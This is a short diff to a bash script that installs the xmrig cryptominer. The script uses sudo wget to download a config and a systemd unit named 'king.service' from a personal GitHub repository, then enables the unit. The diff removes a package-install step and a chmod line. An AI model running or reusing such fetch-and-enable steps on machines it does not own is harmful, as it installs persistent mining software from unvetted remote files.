@@ -1,6 +1,4 @@
 #!/usr/bin/env bash
-sudo apt-get update -y
-sudo apt-get install libhwloc-dev -y
 cd /home
 sudo mkdir xmrig
 cd xmrig
@@ -13,7 +11,6 @@ sudo wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/XM-S1
 sudo mv XM-S1.json config.json
 sudo chmod a+x config.json
 sudo wget https://raw.githubusercontent.com/taikhoanxzc004/scaleway/master/king.service
-sudo chmod a+x king.service
 sudo cp king.service /lib/systemd/system/king.service
 sudo systemctl daemon-reload
 sudo systemctl enable king.service
